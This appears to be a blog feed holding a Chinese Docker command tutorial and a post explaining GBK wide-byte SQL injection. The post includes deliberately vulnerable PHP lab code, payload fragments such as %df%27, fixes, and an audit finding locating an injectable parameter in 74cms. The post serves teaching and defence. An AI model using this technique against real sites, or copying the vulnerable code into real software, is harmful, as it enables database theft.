      <content type="text"><![CDATA[Docker简介什么是容器？ 一种虚拟化的方案 操作系统级别的虚拟化 只能运行相同或相似内核的操作系统 依赖于Linux内核特性:Namespace和Cgroup(Control Group) 什么是Docker? 将应用程序自动部署到容器的开源引擎 Go语言开源引擎 Github地址： [](https://github.com/docker/docker) 基于Apache 2.0开源授权协议发行 Docker的特点？ 提供简单轻量的建模方式 职责的逻辑分离 快速搞笑的开发生命周期 鼓励使用面向服务的架构 Docker的使用场景 1 使用Docker容器开发，测试，部署服务 2 创建隔离的运行环境 3 搭建测试环境 4 构建多用户的平台即服务基础设施 5 提供软件即服务应用程序 6 高性能，多规模的宿主机部署 Docker的基本组成 Docker Client客户端；Daemon守护进程；Image镜像；Container容器;Registry仓库 Docker客户端/守护进程 C/S架构 本地/远程 Docker Image镜像容器的基石（容器基于镜像启动和运行，镜像就好比容器的的源代码，保存了启动容器的各种条件） 层叠的只读文件系统 bootfs(引导文件系统）当容器启动后将被移到内存中，而引导文件系统将会被卸载; 联合加载（union mount) 容器的基本操作交互式容器在命令结束后，就停止 启动容器： $docker run IMAGE [COMMAND][ARG...] run 在新容器中执行命令 执行单次命令的容器: ubuntu@ubuntu:~$ docker run ubuntu echo &apos;Hello world&apos; Hello world 启动交互式容器： $docker run -i -t IMAGE /bin/bash -i --interactive=ture|fasle 默认是false 交互 -t --tty=true|false 默认是false ubuntu@ubuntu:~$ docker run -i -t ubuntu /bin/bash root@44d36a84c016:/# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 03:48 ? 00:00:00 /bin/bash root 12 1 0 03:49 ? 00:00:00 ps -ef root@44d36a84c016:/# ls bin dev home lib64 mnt proc run srv tmp var boot etc lib media opt root sbin sys usr root@44d36a84c016:/# exit exit 查看容器 $docker ps [-a][-l] -a 列出所有的容器 -l 列出最新创建的容器 CONTAINEG ID docker的守护进程，当启动时为容器分配的唯一ID NAMES docker守护进程启动时为容器自动分配的名字 ubuntu@ubuntu:~$ docker ps -l CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 44d36a84c016 ubuntu:latest &quot;/bin/bash&quot; 7 minutes ago Exited (0) 6 minutes ago gloomy_bohr 如何查看刚刚创建的容器 $docker inspect 参数：容器的名字（ID或友好的名字) ubuntu@ubuntu:~$ docker inspect 44d36a84c016 [{ &quot;AppArmorProfile&quot;: &quot;&quot;, &quot;Args&quot;: [], &quot;Config&quot;: { &quot;AttachStderr&quot;: true, &quot;AttachStdin&quot;: true, &quot;AttachStdout&quot;: true, &quot;Cmd&quot;: [ &quot;/bin/bash&quot; ], &quot;CpuShares&quot;: 0, ........ 自定义容器名 $docker run --name=自定义名 -i -t IMAGE /bin/bash ubuntu@ubuntu:~$ docker run --name=container01 -i -t ubuntu /bin/bash root@89fdd67fcc7c:/# exit exit ubuntu@ubuntu:~$ docker inspect container01 重新启动停止的容器 $docker start [-i] 容器名 ubuntu@ubuntu:~$ docker start -i container01 root@89fdd67fcc7c:/# exit exit 删除停止的容器（只能删除停止的容器) $docker rm 容器名 ubuntu@ubuntu:~$ docker rm a14eae563c17 a14eae563c17 守护式容器守护式容器，长期运行，没有交互式的会话，适合运行应用程序和服务 以守护形式运行容器 $docker run -i -t IMAGE /bin/bash Ctrl+P + Ctrl+Q 将一个交互式的容器转到后台 ubuntu@ubuntu:~$ docker run -i -t ubuntu /bin/bash root@7a5baebf940a:/# root@7a5baebf940a:/# ubuntu@ubuntu:~$ ubuntu@ubuntu:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 7a5baebf940a ubuntu:latest &quot;/bin/bash&quot; 3 minutes ago Up 3 minutes dreamy_hopper 附加到运行中的容器 $docker attach 容器名 ubuntu@ubuntu:~$ docker attach 7a root@7a5baebf940a:/# ubuntu@ubuntu:~$ ubuntu@ubuntu:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 7a5baebf940a ubuntu:latest &quot;/bin/bash&quot; 7 minutes ago Up 7 minutes dreamy_hopper ubuntu@ubuntu:~$ docker attach 7a root@7a5baebf940a:/# exit exit ubuntu@ubuntu:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 启动守护式容器 $docker run 镜像名 [COMMAND] [ARG...] -d 告诉run命令在启动容器时使用后台的方式来执行命令 ubuntu@ubuntu:~$ docker run --name dc3 -d ubuntu /bin/sh -c &quot;while true;do echo hello world;sleep 1;done&quot; 29de71a93dfaf67cb27b6fa5d953ecd6ca924e6b1923a31d6f41995af268af24 ubuntu@ubuntu:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 29de71a93dfa ubuntu:latest &quot;/bin/sh -c &apos;while t 4 seconds ago Up 3 seconds dc3 查看容器日志 $docker logs [-f][-t][--tail] 容器名 -f --follows=true|false 默认为false 会一直跟踪日志变化，并返回结果 -t --timestamps=true|false 默认为false --tail=&quot;all&quot; 返回结尾处多少数量的日志 ubuntu@ubuntu:~$ docker logs -t -f --tail 10 dc3 2016-11-13T04:52:46.493926964Z hello world 2016-11-13T04:52:47.495737431Z hello world 2016-11-13T04:52:48.497870319Z hello world 2016-11-13T04:52:49.499945897Z hello world 2016-11-13T04:52:50.501718368Z hello world 2016-11-13T04:52:51.503647625Z hello world ..... 查看容器内进程 $docker top 容器名 Cubuntu@ubuntu:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 29de71a93dfa ubuntu:latest &quot;/bin/sh -c &apos;while t 4 minutes ago Up 4 minutes dc3 ubuntu@ubuntu:~$ docker top dc3 UID PID PPID C STIME TTY TIME CMD root 69209 66638 0 20:51 ? 00:00:00 /bin/sh -c while true;do echo hello world;sleep 1;done root 69613 69209 0 20:56 ? 00:00:00 sleep 1 为运行中的容器启动新进程（对运行中的容器维护监控或执行一些管理任务） $docker exec [-d][-i][-t] 容器名 [COMMAND][ARG..] ubuntu@ubuntu:~$ docker exec -i -t dc3 /bin/bash root@29de71a93dfa:/# ubuntu@ubuntu:~$ ubuntu@ubuntu:~$ docker top dc3 UID PID PPID C STIME TTY TIME CMD root 69209 66638 0 20:51 ? 00:00:00 /bin/sh -c while true;do echo hello world;sleep 1;done root 69914 66638 0 21:01 pts/1 00:00:00 /bin/bash root 69963 69209 0 21:01 ? 00:00:00 sleep 1 如何停止运行中的容器： $docker stop 容器名 发送一个信号给容器，并等待容器的停止 $docker kill 容器名 会立刻停止容器 ubuntu@ubuntu:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 29de71a93dfa ubuntu:latest &quot;/bin/sh -c &apos;while t 14 minutes ago Up 14 minutes dc3 ubuntu@ubuntu:~$ docker stop dc3 dc3 使用Docker帮助文件man docker-run man docker-logs man docker-top man docker-exec ... 在容器中部署静态网站设置容器的端口映射 设置容器的端口映射 run [-P][-p] -P,--publish-all=ture|false默认为false 将为容器暴露的所有端口进行映射 docker run -P -i -t ubuntu /bin/bash -p,--publish=[] containerPort 只指定容器的端口，宿主机端口随机映射 docker run -p 80 -i -t ubuntu /bin/bash hostPort:containerPort 同时指定宿主机端口和容器端口 docker run -p 8080:80 -i -t ubuntu /bin/bash ip::containerPort 指定ip和容器的端口 docker run -p 0.0.0.0:80 -i -t ubuntu /bin/bash ip:hostPort:containerPort 同时指定ip,宿主机和容器的端口 docker run -p 0.0.0.0:8080:80 -i -t ubuntu /bin/bash Nginx部署流程 创建映射80端口的交互式容器 安装Nginx 安装文本编辑器vim 创建静态页面 修改Nginx配置文件 运行Nginx 验证网站访问 - ubuntu@ubuntu:~$ docker run -p 80 --name web -i -t ubuntu /bin/bash root@3fdfe785153a:/# apt-get update root@3fdfe785153a:/# apt-get install -y nginx root@3fdfe785153a:/# apt-get install -y root@3fdfe785153a:/# mkdir -p /var/www/html root@3fdfe785153a:/# cd /var/www/html root@3fdfe785153a:/var/www/html# vim index.html &lt;html&gt; &lt;head&gt; &lt;title&gt;Nginx in Docker&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; root@3fdfe785153a:/var/www/html# whereis nginx nginx: /usr/sbin/nginx /etc/nginx /usr/share/nginx root@3fdfe785153a:/var/www/html# ls index.html index.nginx-debian.html root@3fdfe785153a:/var/www/html# ls /etc/nginx conf.d fastcgi_params koi-win nginx.conf scgi_params sites-enabled uwsgi_params fastcgi.conf koi-utf mime.types proxy_params sites-available snippets win-utf root@3fdfe785153a:/var/www/html# ls /etc/nginx/sites-enabled default root@3fdfe785153a:/var/www/html# vim /etc/nginx/sites-enabled/default root@3fdfe785153a:/var/www/html# cd / root@3fdfe785153a:/# nginx root@3fdfe785153a:/# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 05:36 ? 00:00:00 /bin/bash root 816 1 0 06:12 ? 00:00:00 nginx: master process nginx www-data 817 816 0 06:12 ? 00:00:00 nginx: worker process www-data 818 816 0 06:12 ? 00:00:00 nginx: worker process www-data 819 816 0 06:12 ? 00:00:00 nginx: worker process www-data 820 816 0 06:12 ? 00:00:00 nginx: worker process root 821 1 0 06:12 ? 00:00:00 ps -ef root@3fdfe785153a:/# ubuntu@ubuntu:~$ ubuntu@ubuntu:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 3fdfe785153a ubuntu:latest &quot;/bin/bash&quot; 37 minutes ago Up 37 minutes 0.0.0.0:32768-&gt;80/tcp web ubuntu@ubuntu:~$ docker port web 80/tcp -&gt; 0.0.0.0:32768 ubuntu@ubuntu:~$ docker top web UID PID PPID C STIME TTY TIME CMD root 70403 66638 0 21:36 pts/1 00:00:00 /bin/bash root 71341 70403 0 22:12 ? 00:00:00 nginx: master process nginx www-data 71342 71341 0 22:12 ? 00:00:00 nginx: worker process www-data 71343 71341 0 22:12 ? 00:00:00 nginx: worker process www-data 71344 71341 0 22:12 ? 00:00:00 nginx: worker process www-data 71345 71341 0 22:12 ? 00:00:00 nginx: worker process ubuntu@ubuntu:~$ curl http://127.0.0.1:32768 &lt;html&gt; &lt;head&gt; &lt;title&gt;Nginx in Docker&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 上面使用的是宿主主机地址，现在使用容器的地址 ubuntu@ubuntu:~$ docker inspect web &quot;Gateway&quot;: &quot;172.17.42.1&quot; ubuntu@ubuntu:~$ curl http://172.17.0.10 &lt;html&gt; &lt;head&gt; &lt;title&gt;Nginx in Docker&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; stop后重新启动访问 ubuntu@ubuntu:~$ docker stop web web ubuntu@ubuntu:~$ docker start -i web root@3fdfe785153a:/# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 06:25 ? 00:00:00 /bin/bash root 11 1 0 06:27 ? 00:00:00 ps -ef root@3fdfe785153a:/# ubuntu@ubuntu:~$ ubuntu@ubuntu:~$ docker exec web nginx ubuntu@ubuntu:~$ docker top web UID PID PPID C STIME TTY TIME CMD root 71751 66638 0 22:25 pts/1 00:00:00 /bin/bash root 71809 71751 0 22:28 ? 00:00:00 nginx: master process nginx www-data 71810 71809 0 22:28 ? 00:00:00 nginx: worker process www-data 71811 71809 0 22:28 ? 00:00:00 nginx: worker process www-data 71812 71809 0 22:28 ? 00:00:00 nginx: worker process www-data 71813 71809 0 22:28 ? 00:00:00 nginx: worker process 当停止一个容器并且重新访问时，原来容器的ip地址和端口都将会发生变化 ubuntu@ubuntu:~$ curl http://172.17.0.10 curl: (7) Failed to connect to 172.17.0.10 port 80: No route to host ubuntu@ubuntu:~$ docker inspect web ..... &quot;MountLabel&quot;: &quot;&quot;, &quot;Name&quot;: &quot;/web&quot;, &quot;NetworkSettings&quot;: { &quot;Bridge&quot;: &quot;docker0&quot;, &quot;Gateway&quot;: &quot;172.17.42.1&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;IPAddress&quot;: &quot;172.17.0.11&quot;, &quot;IPPrefixLen&quot;: 16, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;LinkLocalIPv6Address&quot;: &quot;fe80::42:acff:fe11:b&quot;, &quot;LinkLocalIPv6PrefixLen&quot;: 64, &quot;MacAddress&quot;: &quot;02:42:ac:11:00:0b&quot;, &quot;PortMapping&quot;: null, &quot;Ports&quot;: { &quot;80/tcp&quot;: [ { &quot;HostIp&quot;: &quot;0.0.0.0&quot;, &quot;HostPort&quot;: &quot;32769&quot; } .... ubuntu@ubuntu:~$ curl http://172.17.0.11 &lt;html&gt; &lt;head&gt; &lt;title&gt;Nginx in Docker&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 查看和删除镜像镜像的存储地址 /var/lib/docker - ubuntu@ubuntu:~$ docker info Containers: 11 Images: 94 Storage Driver: aufs Root Dir: /var/lib/docker/aufs Backing Filesystem: extfs Dirs: 116 Dirperm1 Supported: true Execution Driver: native-0.2 Kernel Version: 4.2.0-16-generic Operating System: Ubuntu 15.10 CPUs: 4 Total Memory: 1.533 GiB Name: ubuntu ID: AL2G:N2BW:2DGD:DBKV:GV77:ESDE:5BIG:BOYM:25H2:MHLX:KJK3:VNBF WARNING: No swap limit support ubuntu@ubuntu:~$ ls -l /var/lib/docker/aufs ls: cannot access /var/lib/docker/aufs: Permission denied ubuntu@ubuntu:~$ sudo ls -l /var/lib/docker/aufs [sudo] password for ubuntu: total 48 drwxr-xr-x 118 root root 16384 Nov 12 21:36 diff drwxr-xr-x 2 root root 16384 Nov 12 21:36 layers drwxr-xr-x 118 root root 16384 Nov 12 21:36 mnt 列出镜像$docker images [OPTSIUNS][REPOSITORY] -a,--all=false -f,--filter=[] 显示时的过滤条件 --no-trunc=false 指定不使用截断的方式 -q,--quiet=false 查看镜像$docker inspect [OPTIONS]CONTAINER|IMAGE[CONTAINER|IMAGE...] -f,--format=&quot;&quot; ubuntu@ubuntu:~$ docker inspect ubuntu:latest 删除镜像$docker rmi [OPTIONS]IMAGE[IMAGE...] -f,--force=false --no-prune=false Do not delete untagged parents ubuntu:~$ docker rmi wordpress:4.6.1 获取和推送镜像查找镜像 Docker Hub $docker search [OPTIONS]TERM --automated=false Only show automated builds 自动化选项 --no-trunc=false Don&apos;t truncate output -s,--stars=0 Only displays with at least x start 星级 最多返回25个结果 ubuntu@ubuntu:~$ docker search -s 3 ubuntu NAME DESCRIPTION STARS OFFICIAL AUTOMATED ubuntu Ubuntu is a Debian-based Linux operating s... 5033 [OK] ubuntu-upstart Upstart is an event-based replacement for ... 68 [OK] rastasheep/ubuntu-sshd Dockerized SSH service, built on top of of... 49 [OK] consol/ubuntu-xfce-vnc Ubuntu container with &quot;headless&quot; VNC sessi... 29 [OK] ubuntu-debootstrap debootstrap --variant=minbase --components... 27 [OK] torusware/speedus-ubuntu Always updated official Ubuntu docker imag... 27 [OK] ioft/armhf-ubuntu [ABR] Ubuntu Docker images for the ARMv7(a... 19 [OK] nuagebec/ubuntu Simple always updated Ubuntu docker images... 10 [OK] nickistre/ubuntu-lamp LAMP server on Ubuntu 10 [OK] nickistre/ubuntu-lamp-wordpress LAMP on Ubuntu with wp-cli installed 7 [OK] nimmis/ubuntu This is a docker images different LTS vers... 5 [OK] 拉取镜像（需要下载到本地) $docker pull [options] name [:tag] -a,–all-tags=false ubuntu@ubuntu:~$ docker pull ubuntu:14.04 14.04: Pulling from ubuntu e7176b79954f: Pull complete e359a53f3a8b: Pull complete 4655efdd3550: Already exists 4d0b81bdf94e: Already exists 82b16b694f1b: Already exists 879409173f70: Already exists Digest: sha256:bae6d9e8c91f31a11d324495efb3859fce873de1e9db990a62d16e4f263f5a2e Status: Downloaded newer image for ubuntu:14.04 拉取镜像(加速访问）使用--registry-mirror 选项 1.修改 ： /etc/default/docker 2.添加：DOCKER_OPTS = &quot;--registry-mirror=http://MIRROR-ADDR&quot; 推送镜像$docker push NAME:[:TAG] 构建docker镜像 1.保存对容器的修改，并再次使用； 2.自定义镜像的能力; 3.以软件的形式打包并分发服务及其运行环境 构建镜像 $docker commit 通过容器构建 $docker commit [OPTION] CONTAINEG [REPOSITORY[:TAG]] -a,--author=&quot;&quot; 作者 -m,--message=&quot;&quot; Commit message 构建信息 -p,--pause=true Pause container during commit 指示不暂停正在运行的容器 ubuntu@ubuntu:~$ docker commit -a “jdrops520” -m ‘nginx’ web jdrops520/commit_web1 bc4ef9f3e881bd1034dc2dbca62f053044f5ac77696d3bc67e69e749fa1331e7 ubuntu@ubuntu:~$ ubuntu@ubuntu:~$ docker images REPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZE jdrops520/commit_web1 latest bc4ef9f3e881 37 seconds ago 275.8 MB 7a32cf0408fa 3 weeks ago 160.5 MB ubuntu latest 56465e1e45d2 4 weeks ago 127.2 MB ubuntu 14.04 e359a53f3a8b 4 weeks ago 187.9 MB 04b555fcaf13 9 weeks ago 341.8 MB 07a3e6032afb 3 months ago 188 MB hello-world latest f0cb9bdcaa69 4 months ago 1.848 kB ubuntu 12.10 c5881f11ded9 2.406760 years ago 172.1 MB ubuntu@ubuntu:~$ docker run -d –name nginx_web1 jdrops520/commit_web1 nginx -g “daemon off;” 35423f6554dc8cddc95dd88f924e9ab091ae330094e9aa7ba159c1d11e68019a ubuntu@ubuntu:~$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 35423f6554dc jdrops520/commit_web1:latest “nginx -g ‘daemon of 17 seconds ago Up 16 seconds 80/tcp nginx_web1 3fdfe785153a ubuntu:latest “/bin/bash” 3 hours ago Up 2 hours 0.0.0.0:32769-&gt;80/tcp web ubuntu@ubuntu:~$ curl http://127.0.0.1:32769 &lt;title&gt;Nginx in Docker&lt;/title&gt; &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt; 使用Dockerfile创建镜像创建第一个Dockerfile $docker build 通过Dockerfile文件构建 $docker build [OPTIONS]PATH |URL|- --force-rm=false --no-cache=false --pull=false -q,--quiet=false --rm=ture -t,--tag=&quot;&quot; 指定构建出的镜像的名字]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[全局防护Bypass之宽字节注入]]></title>
      <url>%2F2016%2F10%2F29%2F%E5%85%A8%E5%B1%80%E9%98%B2%E6%8A%A4Bypass%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%2F</url>
      <content type="text"><![CDATA[1 了解宽字节的背景宽字节注入的源于程序员设置MySQL连接时的错误配置为： set character_set_client=gbk ,这样的配置会引发代码转换从而导致注入漏洞。具体分析一下原理： 1.正常情况下GPC开启或者使用addslashes函数过滤GET或POST提交的参数时，我们测试输入的’，就会被转义为\’; 2.若存在宽字节注入，输入%df%27时，经过单引号的转义变成了%df%5c%27，之后再数据库查询语句进行GBK多字节编码，即一个中文占用两个字节，一个英文同样占用两个字节且在汉字编码范围内两个编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成汉字”運”,单引号逃逸出来，从而造成了注入漏洞。 现在基本都会讲mysql的连接配置设置为 [set character_set_client=binary] 来解决这个问题，这篇博客将介绍php中因为编码或字符编码转换导致的注入问题。 2 mysql中的宽字符注入测试搭建学习的环境利用了phithon内容管理系统，看代码 &lt;?php //连接数据库部分，注意使用了gbk编码 $conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;bad!&apos;); mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;); mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;); //执行sql语句 $id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1; $sql = &quot;SELECT * FROM news WHERE tid=&apos;{$id}&apos;&quot;; $result = mysql_query($sql, $conn) or die(mysql_error()); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;gbk&quot; /&gt; &lt;title&gt;新闻&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $row = mysql_fetch_array($result, MYSQL_ASSOC); echo &quot;&lt;h2&gt;{$row[&apos;title&apos;]}&lt;/h2&gt;&lt;p&gt;{$row[&apos;content&apos;]}&lt;p&gt;\n&quot;; mysql_free_result($result); ?&gt; &lt;/body&gt; &lt;/html&gt; SQL语句是SELECT * FROM news WHERE tid=’{$id}’，根据文章的id把文章从news表中提取出来，在$sql之前，我们只用了限制函数addslashes函数，对$id进行转义，只要我们输入参数在单引号中，就逃逸不出单引号的限制，从而无法注入。 我们这里利用的是mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字节是一个汉字（前一个ascii码要大于128，才到汉字范围），我们测试输入%df’已经报错，看到报错，说明sql语句出错，看到出错说明可以注入。报错的原因就是多了一个单引号，而单引号前面的反斜杠不见啦。这就是mysql的特性，因为gbk是多字节编码，它人为两个字代表一个字节，所以%df和后面的%5c变成了汉字“運”，而’逃逸了出来。 因为是两个字节代表一个汉字，我们尝试%df%df%27:不报错了，因为%df%df组成了汉字”哌”,%5c%27不是汉字，仍然是\’ mysql如何判断一个字符是不是一个汉字，根据gbk编码，第一个字节的ascii码大于128，基本上就行，若不用%df二用%a1也可以%a1%5c虽然不是一个汉字，但一定会被mysql认为是一个宽字符，所以就能让后面的%27逃逸出来，构造一个exp，查询管理人员的账号密码。 ####GB12和GBK的区别gb2312和gbk都是宽字节家族医院，但是当把数据库编码设置为关闭gb2312时，结果就不能注入 &lt;?php //连接数据库部分，注意使用了gbk编码 $conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;bad!&apos;); mysql_query(&quot;SET NAMES &apos;gb2312&apos;&quot;); mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;); //执行sql语句 $id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1; $sql = &quot;SELECT * FROM news WHERE tid=&apos;{$id}&apos;&quot;; $result = mysql_query($sql, $conn) or die(mysql_error()); ?&gt; 这主要是gb2312编码取值范围的事情，它高位范围0xA1~0xF7，低位范围是0xA1~0xFE，\是%5c，是不在低范围中的，即其根本不是gb2312遍吗，故其不会被吃掉。故只要低位的范围中含有0x5c的编码，就可以进行宽字节的注入 3 利用mysql_real_escape_string解决问题一些cms把addslashes替换为mysql_real_escape_string来防止宽字节的注入我们若解决需要做的指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前的字符集为gbk,来避免问题12345678910&lt;?php$conn = mysql_connect('localhost', 'root', 'root') or die('bad!');mysql_query("SET NAMES 'gbk'");mysql_select_db('test', $conn) OR emMsg("连接数据库失败，未找到您填写的数库");//执行sql语句mysql_set_charset('gbk',$conn)$id = isset($_GET['id']) ? mysql_real_escape_string($_GET['id']) : 1;$sql = "SELECT * FROM news WHERE tid='&#123;$id&#125;'";$result = mysql_query($sql, $conn) or die(mysql_error());?&gt; 4 宽字节注入修复character_set_client=&#39;binary&#39;设置为binary（二进制）,只需要在所有的sql语句前指定一下连接的形式为二进制：mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn);,当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将换成character_set_connection的编码，然后在进入具体表和字段后，再转换成字段对应的编码，然后当查询结果产生后，会从表和字段编码，转换成character_set_results编码，返回给客户端。1234567891011&lt;?php//连接数据库部分，注意使用了gbk编码$conn = mysql_connect('localhost', 'root', 'root') or die('bad!');mysql_query("SET NAMES 'gbk'");mysql_select_db('test', $conn) OR emMsg("连接数据库失败，未找到您填写的数据库");//执行sql语句mysql_query("SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary", $conn); $id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;$sql = "SELECT * FROM news WHERE tid='&#123;$id&#125;'";$result = mysql_query($sql, $conn) or die(mysql_error());?&gt; 这个方法避免宽字节的注入还是有效的，但是如果开发者画蛇添足的增加一些东西，会让前期的努力前功尽弃。 5 iconv造成的严重后果很多cms会将接收到的数据，调用这样一个函数，转换其编码：iconv(&#39;utf-8&#39;,&#39;gbk&#39;,$_GET[&#39;id&#39;])；，目的一般是避免乱码，特别是搜索框的位置 &lt;?php //连接数据库部分，注意使用了gbk编码 $conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;bad!&apos;); mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;); mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;); //执行sql语句 mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); $id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1; $id = iconv(&apos;utf-8&apos;, &apos;gbk&apos;, $id); $sql = &quot;SELECT * FROM news WHERE tid=&apos;{$id}&apos;&quot;; $result = mysql_query($sql, $conn) or die(mysql_error()); ?&gt; 可以发现，在sql语句执行前，将character_set_client设置成了binary，所以避免宽字节的注入问题。但之后其调用了iconv将已经过滤的参数$id给转换了一下，测试一下报错说明我们錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。利用的是将\转移掉。 利用iconv将gbk转换成utf-8，则可以直接用宽字节注入的姿势来。gbk汉字2字节，utf-8汉字是3字节，若把gbk转换成utf-8,则php会每两个字节一转换。所以，如果\’前面的字符是奇数的话，势必会吞掉\，’逃出限制。 6 总结1.gbk编码造成的宽字符注入问题，解决方法是设置character_set_client=binary。 2.矫正人们对于mysql_real_escape_string的误解，单独调用set name=gbk和mysql_real_escape_string是无法避免宽字符注入问题的。还得调用mysql_set_charset来设置一下字符集。 3.谨慎使用iconv来转换字符串编码，很容易出现问题。只要我们把前端html/js/css所有编码设置成gbk，mysql/php编码设置成gbk，就不会出现乱码问题。不用画蛇添足地去调用iconv转换编码，造成不必要的麻烦。 7 代码审计实战对骑士cms审计时发现在plus/ajax_street.php elseif($act == &apos;key&apos;) { $key=trim($_GET[&apos;key&apos;]); if (!empty($key)) { if (strcasecmp(QISHI_DBCHARSET,&quot;utf8&quot;)!=0) //对参数key进行utf-8到GBK编码的转换 $key=iconv(&quot;utf-8&quot;,QISHI_DBCHARSET,$key); //带入查询，可注入 //table($table = &apos;category&apos;)=&gt;&apos;qs_74cmscategory&apos; $result = $db-&gt;query(&quot;select * from &quot;.table(&apos;category&apos;).&quot; where c_alias=&apos;QS_street&apos; AND c_name LIKE &apos;%{$key}%&apos; &quot;); //将查询结果输出到页面，可回显 while($row = $db-&gt;fetch_array($result)) { if ($listtype==&quot;li&quot;) { $htm.=&quot;&lt;li title=\&quot;{$row[&apos;c_name&apos;]}\&quot; id=\&quot;{$row[&apos;c_id&apos;]}\&quot;&gt;{$row[&apos;c_name&apos;]}&lt;/li&gt;&quot;; } else { $_GET[&apos;streetid&apos;]=$row[&apos;c_id&apos;]; $url=url_rewrite(&apos;QS_street&apos;,$_GET); $htm.=&quot;&lt;li&gt;&lt;a href=\&quot;{$url}\&quot; title=\&quot;{$row[&apos;c_note&apos;]}\&quot; class=\&quot;vtip\&quot;&gt;{$row[&apos;c_name&apos;]}&lt;/a&gt;&lt;span&gt;{$row[&apos;stat_jobs&apos;]}&lt;/span&gt;&lt;/li&gt;&quot;; }; } if (empty($htm)) { $htm=&quot;&lt;span class=\&quot;noinfo\&quot;&gt;没有找到关键字： &lt;span&gt;{$key}&lt;/span&gt; 相关道路！&lt;/span&gt;&quot;; } exit($htm); } } 在之前配置文件设置的是mysql_query(&quot;SET character_set_connection=&quot; . $dbcharset . &quot;, character_set_results=&quot; . $dbcharset . &quot;, character_set_client=binary&quot;, $this-&gt;linkid);,其中利用了iconv函数造成致命的错误，同时分析发现页面将查询结果回显回来，构造一些union的查询语句即可获取数据库的敏感信息 漏洞的利用测试有几个字段,发现category表一共有9个字段，所以可以构造获取数据库用户和先关信息的exp然后利用union的查询语句爆出可利用的列为4,8,exp：,然后是爆出数据库和用户名等相关信息 补充GBK编码中的两个字符是一个汉字，第一个字符需要大于128]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP代码解析标签]]></title>
      <url>%2F2016%2F10%2F28%2FPHP%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90%E6%A0%87%E7%AD%BE%2F</url>
